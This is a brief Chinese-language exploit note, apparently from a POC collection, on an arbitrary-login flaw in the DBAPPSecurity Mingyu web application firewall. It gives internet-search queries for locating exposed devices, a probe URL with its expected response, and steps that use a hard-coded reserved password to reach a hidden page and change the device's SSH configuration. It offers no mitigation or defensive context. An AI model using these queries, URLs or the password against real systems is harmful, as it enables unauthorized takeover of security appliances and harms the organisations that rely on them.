# 安恒 明御WEB应用防火墙 任意登录漏洞

## 网络测绘

fofa: app="安恒信息-明御WAF"

hunter: web.title="明御WEB应用防火墙"

## POC / EXP

```
/report.m?a=rpc-timed
```

```
# 响应体
error_0x110005
```

```
直接访问URL，删除URI

可以更改SSH的配置
/system.m?a=reserved

在密码框中，输入密码
!@#dbapp-waf-dev-reserved#@!

就可以更改SSH配置
```